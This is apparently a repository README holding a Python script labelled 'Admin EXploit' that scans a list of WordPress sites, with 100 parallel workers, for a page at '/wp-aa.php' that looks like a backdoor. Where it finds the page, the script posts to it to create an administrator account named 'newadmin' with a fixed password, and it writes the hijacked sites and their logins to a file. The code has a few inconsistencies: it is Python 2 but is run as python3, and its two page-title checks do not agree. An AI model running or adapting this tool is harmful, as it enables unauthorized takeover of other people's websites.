# Add-New-WordPress-Admin
Add New WordPress Admin<br>

Test on WordPress 6.5.x<br>
python3 admin-add.py wordpres_list.txt<br>

result : <br>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://www.WordPresssite.com/wp-login.phpp#newadmin@newadminpassword123

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import sys
import requests
import re
import random
import string
from multiprocessing import Pool
from urlparse import urlparse
import colorama

colorama.init()
requests.packages.urllib3.disable_warnings()

RED = '\033[31m'
GREEN = '\033[0;32m'
RESET = '\033[0m'

def read_file(filename):
    try:
        with open(filename, 'rb') as file:
            return file.readlines()
    except IOError:
        print '\n  [Error] File "{}" not found!\n'.format(filename)
        sys.exit(1)

def extract_domain(url):
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme if parsed_url.scheme else 'http'
    return scheme + '://' + parsed_url.netloc

def exploit_wordpress(url):
    try:
        url = url.strip()
        domain = extract_domain(url)
        target_url = domain + '/wp-aa.php'
        response = requests.get(target_url, verify=False, timeout=15)
        if "<title>Add a New WordPress Admin</title>" in response.text:
            if re.search(r'<title>Add WordPress Admin</title>', response.text, re.IGNORECASE | re.UNICODE):
                user_name = 'newadmin'
                pwd = 'newadminpassword123'
                payload = {'user_name': user_name, 'pwd': pwd, 'email': 'youremail@mail.com'} 
                response = requests.post(target_url, data=payload, verify=False, timeout=15)
                if "youremail@mail.com" in response.text:
                    print ' => {} --> {}[Successfully User added]{}'.format(url, GREEN, RESET)
                    with open('Successfully-added.txt', 'a') as f:
                        f.write(url + "/wp-login.php#" + user_name + "@" + pwd + "\n")
                else:
                    print ' => {} --> {}[User Not added]{}'.format(url, RED, RESET)
            else:
                print ' => {} --> {}[Not Vulnerable]{}'.format(url, RED, RESET)
        else:
            print ' => {} --> {}[Not Vulnerable]{}'.format(url, RED, RESET)
    except requests.exceptions.Timeout:
        print ' => {} --> {}[Connection Timeout]{}'.format(url, RED, RESET)
    except Exception as e:
        print ' => {} --> {}[Failed to Connect]{}'.format(url, RED, RESET)

if __name__ == "__main__":
    print(""" [#] A:: Admin EXploit """)
    if len(sys.argv) != 2:

        print '\n  Usage: python3 {} <sites.txt>\n'.format(sys.argv[0])
        sys.exit(1)
    try:
        target_sites = read_file(sys.argv[1])
    except IOError:
        print '\n  [Error] File "{}" not found!\n'.format(sys.argv[1])
        sys.exit(1)
    pool = Pool(100)
    pool.map(exploit_wordpress, target_sites)
    pool.close()
    pool.join()

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
